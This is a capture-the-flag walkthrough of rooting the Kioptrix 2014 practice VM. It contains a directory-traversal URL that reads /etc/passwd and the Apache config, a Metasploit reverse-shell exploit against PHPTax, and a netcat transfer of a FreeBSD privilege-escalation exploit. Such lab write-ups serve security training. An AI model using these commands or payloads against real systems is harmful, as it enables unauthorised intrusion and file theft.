# Kioptrix 2014

`tar -xf Kioptrix.tar.bz`
**Note:** I did have some trouble with VMWare Player with this VM. I couldn’t get NAT networking to work right away, so I had to delete and re-add the Network adapter before it would work. Something to keep in mind if you run into trouble.

![](https://i.imgur.com/OyB5KmV.png)
Host is `192.168.227.128`
![](https://i.imgur.com/tkPxdD1.png)
Victim is `192.168.227.129`
`nmap -sS -sV -p- -oN NampKioptrixLv4.txt 192.168.227.129`
![](https://i.imgur.com/ys8IevP.png)
We got only SSH and 2 Web service, SSH in closed, that's weird. Web on 8080 is forbiddened, there might be something that block these.
Let's take a look what Web is.
![](https://i.imgur.com/bJdie07.png)
Nothing.
`dirb` it.
![](https://i.imgur.com/xnA7GJ3.png)
Nope.
How about web in 8080.
![](https://i.imgur.com/n4QU5yO.png)
How about source of the page?
Port: 80
![](https://i.imgur.com/FVjtHke.png)
Port: 8080
![](https://i.imgur.com/dKIbT0P.png)
Something interestin here in port 80 page source: 
```html=
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>
```
`pChart2.1.3` seems a service.
![](https://i.imgur.com/xwioECF.png)

Google it with more infomation, then [it](https://www.exploit-db.com/exploits/31173) show that 
> PHP library pChart 2.1.3 (and possibly previous versions) by default
contains an examples folder, where the application is vulnerable to
Directory Traversal and Cross-Site Scripting (XSS).
Now, we simply modified the leaking info URL with our parameters: `http://192.168.227.129/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd`
![](https://i.imgur.com/dAjbDOO.png)
And the LFI lead us got AC/service here.
However, we got bad news here and it explain why SSH is closed and port 8080 is forbiddened.
The OSSEC, which is a Host Intrusion Detection System (HIDS), and it normally comes with some rules that will automatically block any brute force attacks.

Virtual hosts are normally configured in an Apache configuration file. On Linux, the `/etc/apache2/apache2.conf` file and see what was there. However this machine isn’t Linux, it’s FreeBSD. So after a bit of digging, we found that on FreeBSD, the Apache configuration file is located at `/usr/local/etc/apache22/httpd.conf` instead.

Let's LFI the file, `curl "http://192.168.127.141/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf" | html2text`
![](https://i.imgur.com/0PLmFvw.png)
In the end of the file, we saw the virtaul machine setting the only allow the flag in header which specified that `Mozilla4_browser`
Let's use `curl` flag to get the content.
`curl -H "User-Agent:Mozilla/4.0" http://192.168.227.129:8080/`
![](https://i.imgur.com/0abI6i6.png)
Now we see the service on 8080 is PHPTAX, so what's the version? that might be vulnerable.
![](https://i.imgur.com/3PsOOvK.png)
Nope. We need to step back to the raw.
![](https://i.imgur.com/steLYfb.png)
Here we got hte phptax version in the header.
We search the exploit, then we find the PoC.
![](https://i.imgur.com/xQP8Gqa.png)
Then we find there's metasploit module already in the `MS`F.
Turn on the `MSF`.
```shell
msfconsole
use exploit/multi/http/phptax_exe
set payload cmd/unix/reverse
show options
set RHOSTS 192.168.227.129
set RPORT 8080
set LHOST eth0
set LPORT 9001
show advanced
set UserAgent Mozilla/4.0
exploit
```
![](https://i.imgur.com/jqwszKZ.png)
![](https://i.imgur.com/IORnB4c.png)
Exploit it.
![](https://i.imgur.com/b7kPrhE.png)
Now we in.
After identified shell's privilege, first we check the OS verion by `uname -a`
![](https://i.imgur.com/NyxQzEX.png)
Search exploit of `FreeBSD 9.0`
![](https://i.imgur.com/Jv4gbcf.png)
Here we got the POE payload, now we need to transfer the payload to the target and compiling it.
First, we check the local env support:
![](https://i.imgur.com/O1u68Cg.png)
Only `nc` & `gcc` installed, but that's enough.
Let setup a service to offer the payload with `nc -nvlp 8080 < /usr/share/exploitdb/exploits/freebsd/local/28718.c`
![](https://i.imgur.com/scGpJtI.png)
![](https://i.imgur.com/nhhEdyb.png)
Use `md5` to check if the payload actually transfer completely.
![](https://i.imgur.com/Ns25b6s.png)
We got root now.
Go to `/root` to `cat` the congratz text.
![](https://i.imgur.com/8dHnBCi.png)


